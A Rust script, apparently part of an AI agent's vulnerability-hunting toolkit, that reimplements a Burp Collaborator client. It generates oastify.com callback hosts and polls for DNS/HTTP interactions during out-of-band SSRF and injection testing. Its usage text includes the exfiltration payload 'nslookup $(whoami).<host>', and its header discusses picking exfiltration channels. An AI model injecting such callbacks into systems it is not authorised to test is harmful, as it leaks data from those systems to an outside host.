#!/usr/bin/env rust-script
//! name: burp_collab
//! description: Burp Collaborator 公共服客户端(OOB 读取面) - 自持 secret 派生 <label>.oastify.com 载荷,轮询 polling.oastify.com/burpresults?biid=<b64 secret> 取回交互(DNS/HTTP),补上"回调到达即判定、但外传数据不可读"的缺口;交互读出即消费。信道选型律(kimi G3 跨题=2):外传优先路径/DNS 标签明文(免复制免解码,题 145/146 实证),body 信道有丢字符风险须核 content_length_check。合法授权测试用途。
//! version: 1.0.1
//! args: <new|poll|list> [--custom S] [--state FILE] [--biid B64] [--server DOMAIN] [--poll-host HOST] [--json] [--selftest]
//! keywords: oob, burp, collaborator, oastify, oast, dns, exfil, ssrf, 漏洞猎手套件
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! sha1 = "0.10"
//! ```

use pi_rust_lib::serde_json::{self, json, Value};
use std::io::Read;
use std::net::ToSocketAddrs;
use std::path::PathBuf;
use std::time::Duration;

const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
const DEF_SERVER: &str = "oastify.com";
const DEF_POLL_HOST: &str = "polling.oastify.com";

fn idx(c: u8) -> Option<usize> {
    ALPHABET.iter().position(|&x| x == c)
}

fn rand_bytes(n: usize) -> Result<Vec<u8>, String> {
    let mut f = std::fs::File::open("/dev/urandom").map_err(|e| format!("/dev/urandom: {e}"))?;
    let mut buf = vec![0u8; n];
    f.read_exact(&mut buf).map_err(|e| format!("urandom read: {e}"))?;
    Ok(buf)
}

fn base64(data: &[u8]) -> String {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | b[2] as u32;
        out.push(T[(n >> 18) as usize & 63] as char);
        out.push(T[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 { T[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if chunk.len() > 2 { T[n as usize & 63] as char } else { '=' });
    }
    out
}

fn url_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~') {
            out.push(b as char);
        } else {
            out.push_str(&format!("%{b:02X}"));
        }
    }
    out
}

/// Big-endian integer -> base36 (custom alphabet a..z0..9), matching the Collaborator client.
fn base36_be(bytes: &[u8]) -> String {
    let mut digits = Vec::new();
    let mut work = bytes.to_vec();
    loop {
        let mut rem: u32 = 0;
        let mut all_zero = true;
        for b in work.iter_mut() {
            let cur = rem * 256 + *b as u32;
            *b = (cur / 36) as u8;
            rem = cur % 36;
            if *b != 0 {
                all_zero = false;
            }
        }
        digits.push(ALPHABET[rem as usize]);
        if all_zero {
            break;
        }
    }
    digits.reverse();
    String::from_utf8(digits).unwrap()
}

fn checksum_char(value: &str) -> char {
    let sum: usize = value.bytes().map(|b| b as usize).sum();
    ALPHABET[sum % 36] as char
}

fn key_hash(raw_biid: &[u8]) -> String {
    use sha1::{Digest, Sha1};
    let digest = Sha1::digest(raw_biid);
    let mut enc = base36_be(&digest);
    while enc.len() < 20 {
        enc.insert(0, 'a');
    }
    let key = &enc[..20];
    let (left, right) = (&key[..10], &key[10..20]);
    format!("{left}{}{right}{}", checksum_char(left), checksum_char(right))
}

fn encrypt_interaction_id(plaintext: &str, salt: (u8, u8)) -> Result<String, String> {
    let (s1, s2) = salt;
    let mut state = [s1, s2];
    let mut out = String::new();
    for (i, ch) in plaintext.bytes().enumerate() {
        let ci = idx(ch).ok_or_else(|| format!("unsupported payload char {:?}", ch as char))?;
        let reg = i % 2;
        let si = idx(state[reg]).unwrap();
        let cc = ALPHABET[(ci + si) % 36];
        out.push(cc as char);
        state[reg] = cc;
    }
    let salt_chk = ALPHABET[(s1 as usize + s2 as usize) % 36];
    Ok(format!("{}{}{}{}", s1 as char, s2 as char, salt_chk as char, out))
}

fn derive_label(raw_biid: &[u8], counter: u64) -> Result<String, String> {
    let kh = key_hash(raw_biid);
    let client_part = format!("{counter:x}y");
    let plaintext = format!("{kh}1g{client_part}z");
    let r = rand_bytes(2)?;
    let salt = (ALPHABET[r[0] as usize % 36], ALPHABET[r[1] as usize % 36]);
    encrypt_interaction_id(&plaintext, salt)
}

fn decode_b64(s: &str) -> Result<Vec<u8>, String> {
    const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = Vec::new();
    let mut acc: u32 = 0;
    let mut bits = 0;
    for c in s.bytes() {
        if c == b'=' || c == b'\n' || c == b'\r' {
            continue;
        }
        let v = T.iter().position(|&x| x == c).ok_or_else(|| format!("bad base64 char {}", c as char))? as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Ok(out)
}

fn state_path(cli: &Option<String>) -> PathBuf {
    if let Some(p) = cli {
        return PathBuf::from(p);
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    PathBuf::from(format!("{home}/.pi-rs/agent/burp-collab-state.json"))
}

fn load_state(p: &PathBuf) -> Value {
    std::fs::read_to_string(p)
        .ok()
        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
        .unwrap_or_else(|| json!({"biid": null, "counter": 0, "payloads": []}))
}

fn save_state(p: &PathBuf, v: &Value) -> Result<(), String> {
    if let Some(dir) = p.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("mkdir {}: {e}", dir.display()))?;
    }
    std::fs::write(p, serde_json::to_string_pretty(v).unwrap()).map_err(|e| format!("write: {e}"))
}

fn poll(server: &str, biid: &str) -> Result<Value, String> {
    let url = format!("https://{server}/burpresults?biid={}", url_encode(biid));
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(20)).build();
    let resp = agent
        .get(&url)
        .set("Accept", "application/json")
        .set("User-Agent", "pi-rs-burp_collab/1.0")
        .call()
        .map_err(|e| format!("poll {url}: {e}"))?;
    let declared = resp.header("Content-Length").and_then(|v| v.parse::<usize>().ok());
    let body = resp.into_string().map_err(|e| format!("read body: {e}"))?;
    // G2(kimi,题 146 实证):body 信道丢字符的守门旗标——声明长与实收长
    // 不一致即标 mismatch,调用方见 mismatch 不硬读凭据。
    let check = match declared {
        Some(d) if d == body.len() => "ok",
        Some(_) => "mismatch",
        None => "absent",
    };
    if body.trim().is_empty() {
        return Ok(json!({"responses": [], "content_length_check": check}));
    }
    let mut v: Value = serde_json::from_str(&body)
        .map_err(|e| format!("parse response: {e} :: {}", &body[..body.len().min(200)]))?;
    if let Some(obj) = v.as_object_mut() {
        obj.insert("content_length_check".to_string(), json!(check));
    }
    Ok(v)
}

fn resolve_ok(name: &str) -> bool {
    // use the OS resolver: this makes a real recursive lookup that reaches the
    // Collaborator authoritative server (a raw 8.8.8.8 UDP query can be answered
    // from a local cache and never reach it)
    match (name, 0u16).to_socket_addrs() {
        Ok(mut it) => it.next().is_some(),
        Err(_) => false,
    }
}

fn summarize(interactions: &[Value]) -> Vec<Value> {
    interactions
        .iter()
        .map(|it| {
            let data = it.get("data").cloned().unwrap_or(json!({}));
            let sub = data.get("subDomain").and_then(|v| v.as_str()).unwrap_or("");
            let proto = it.get("protocol").and_then(|v| v.as_str()).unwrap_or("");
            // the label is the second-level name; everything before it is the exfiltrated payload
            let prefix = sub.split('.').next().unwrap_or("").to_string();
            json!({
                "protocol": proto,
                "time": it.get("time").cloned().unwrap_or(Value::Null),
                "client": it.get("client").cloned().unwrap_or(Value::Null),
                "sub_domain": sub,
                "prefix": prefix,
                "interaction_id": it.get("interactionString").cloned().unwrap_or(Value::Null),
                "dns_type": data.get("type").cloned().unwrap_or(Value::Null),
                "raw_request_b64": data.get("rawRequest").cloned().unwrap_or(Value::Null),
                "http_request_b64": data.get("request").cloned().unwrap_or(Value::Null),
            })
        })
        .collect()
}

fn selftest() -> Result<Value, String> {
    let seed = rand_bytes(32)?;
    let biid = base64(&seed);
    let label = derive_label(&seed, 0)?;
    let host = format!("{label}.{DEF_SERVER}");
    // self-check: the cipher is reversible (recover the plaintext prefix from the label)
    let body = &label[3..];
    let (s1, s2) = (label.as_bytes()[0], label.as_bytes()[1]);
    let mut state = [s1, s2];
    let mut plain = String::new();
    for (i, ch) in body.bytes().enumerate() {
        let ci = idx(ch).unwrap();
        let si = idx(state[i % 2]).unwrap();
        let pc = ALPHABET[(ci + 36 - si) % 36];
        plain.push(pc as char);
        state[i % 2] = ch;
    }
    let kh = key_hash(&seed);
    let reversible = plain == format!("{kh}1g0yz") || plain.starts_with(&kh);
    let marker = format!("st{}", &label[..6]);
    let qname = format!("{marker}.{host}");
    let resolved = resolve_ok(&qname);
    let mut hits = Vec::new();
    for _ in 0..8 {
        std::thread::sleep(Duration::from_millis(2500));
        let resp = poll(DEF_POLL_HOST, &biid)?;
        let list = resp.get("responses").and_then(|v| v.as_array()).cloned().unwrap_or_default();
        let matched: Vec<Value> = summarize(&list)
            .into_iter()
            .filter(|s| s["sub_domain"].as_str().unwrap_or("").starts_with(&marker))
            .collect();
        if !matched.is_empty() {
            hits = matched;
            break;
        }
    }
    Ok(json!({
        "biid": biid,
        "label": label,
        "label_len": label.len(),
        "host": host,
        "qname": qname,
        "resolved": resolved,
        "cipher_reversible": reversible,
        "retrieved": hits,
    }))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut sub = String::new();
    let mut custom = String::new();
    let mut state_cli: Option<String> = None;
    let mut biid_cli: Option<String> = None;
    let mut server = DEF_SERVER.to_string();
    let mut poll_host = DEF_POLL_HOST.to_string();
    let mut pretty = false;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--custom" => {
                i += 1;
                if i < args.len() {
                    custom = args[i].clone();
                }
            }
            "--state" => {
                i += 1;
                if i < args.len() {
                    state_cli = Some(args[i].clone());
                }
            }
            "--biid" => {
                i += 1;
                if i < args.len() {
                    biid_cli = Some(args[i].clone());
                }
            }
            "--server" => {
                i += 1;
                if i < args.len() {
                    server = args[i].clone();
                }
            }
            "--poll-host" => {
                i += 1;
                if i < args.len() {
                    poll_host = args[i].clone();
                }
            }
            "--json" => pretty = true,
            "--selftest" => sub = "selftest".into(),
            other if !other.starts_with("--") && sub.is_empty() => sub = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if sub == "selftest" {
        match selftest() {
            Ok(d) => { let _ = pi_rust_lib::report::success("burp_collab", d, "run `burp_collab new`, inject <host>, then poll"); }
            Err(e) => pi_rust_lib::report::failure("burp_collab", &format!("selftest: {e}"), "check outbound DNS/UDP 53 and HTTPS to polling.oastify.com"),
        }
        return;
    }

    let path = state_path(&state_cli);
    let mut st = load_state(&path);
    if let Some(b) = &biid_cli {
        let raw = match decode_b64(b) {
            Ok(v) => v,
            Err(e) => {
                pi_rust_lib::report::failure("burp_collab", &format!("--biid: {e}"), "pass standard base64 of 32 raw bytes");
                std::process::exit(2);
            }
        };
        if raw.len() != 32 {
            pi_rust_lib::report::failure(
                "burp_collab",
                &format!("--biid decodes to {} bytes, expected 32", raw.len()),
                "pass standard base64 of 32 raw bytes",
            );
            std::process::exit(2);
        }
        st["biid"] = json!(b);
    }

    let raw = match st.get("biid").and_then(|v| v.as_str()) {
        Some(b) => match decode_b64(b) {
            Ok(v) => v,
            Err(e) => {
                pi_rust_lib::report::failure("burp_collab", &format!("stored biid: {e}"), "delete the state file or pass --biid");
                std::process::exit(2);
            }
        },
        None => {
            if sub != "new" {
                pi_rust_lib::report::failure("burp_collab", "no context yet", "run `burp_collab new` first to create a secret");
                std::process::exit(2);
            }
            let seed = match rand_bytes(32) {
                Ok(v) => v,
                Err(e) => {
                    pi_rust_lib::report::failure("burp_collab", &e, "cannot read /dev/urandom");
                    std::process::exit(1);
                }
            };
            st["biid"] = json!(base64(&seed));
            seed
        }
    };

    match sub.as_str() {
        "new" => {
            let counter = st.get("counter").and_then(|v| v.as_u64()).unwrap_or(0);
            let label = match derive_label(&raw, counter) {
                Ok(l) => l,
                Err(e) => {
                    pi_rust_lib::report::failure("burp_collab", &e, "internal derivation error");
                    std::process::exit(1);
                }
            };
            let suffix = if custom.is_empty() {
                String::new()
            } else {
                format!("{}.", custom.trim_matches('.').to_lowercase())
            };
            let host = format!("{suffix}{label}.{server}");
            st["counter"] = json!(counter + 1);
            if let Some(arr) = st.get_mut("payloads").and_then(|v| v.as_array_mut()) {
                arr.push(json!({"counter": counter, "label": label, "host": host}));
            }
            if let Err(e) = save_state(&path, &st) {
                pi_rust_lib::report::failure("burp_collab", &e, "pass a writable --state");
                std::process::exit(1);
            }
            let d = json!({
                "counter": counter,
                "label": label,
                "host": host,
                "dns": host,
                "http": format!("http://{host}/"),
                "https": format!("https://{host}/"),
                "usage": format!("inject the callback as <data>.{host} (e.g. nslookup $(whoami).{host}); then `burp_collab poll`"),
                "state": path.display().to_string(),
            });
            let _ = pi_rust_lib::report::success("burp_collab", d, "inject the callback, then run `burp_collab poll`");
        }
        "poll" => {
            let biid = st["biid"].as_str().unwrap_or("").to_string();
            match poll(&poll_host, &biid) {
                Ok(resp) => {
                    let list = resp.get("responses").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                    let items = summarize(&list);
                    let d = json!({
                        "poll_host": poll_host,
                        "raw_count": list.len(),
                        "interactions": items,
                        "raw": if pretty { resp } else { Value::Null },
                    });
                    if list.is_empty() {
                        let _ = pi_rust_lib::report::success(
                            "burp_collab",
                            d,
                            "no interactions yet (reads are consumed) - wait and poll again",
                        );
                    } else {
                        let _ = pi_rust_lib::report::success("burp_collab", d, "decode the sub_domain prefix / b64 fields");
                    }
                }
                Err(e) => pi_rust_lib::report::failure("burp_collab", &e, "check HTTPS reachability of the poll host"),
            }
        }
        "list" => {
            let d = json!({
                "state": path.display().to_string(),
                "counter": st.get("counter").cloned().unwrap_or(json!(0)),
                "payloads": st.get("payloads").cloned().unwrap_or(json!([])),
                "biid_present": st.get("biid").map(|v| !v.is_null()).unwrap_or(false),
            });
            let _ = pi_rust_lib::report::success("burp_collab", d, "run `burp_collab new` to add a payload");
        }
        _ => {
            pi_rust_lib::report::failure(
                "burp_collab",
                "usage: burp_collab <new|poll|list> [--custom S] [--state FILE] [--biid B64] [--server DOMAIN] [--poll-host HOST] [--json] [--selftest]",
                "start with `burp_collab new`",
            );
            std::process::exit(2);
        }
    }
}
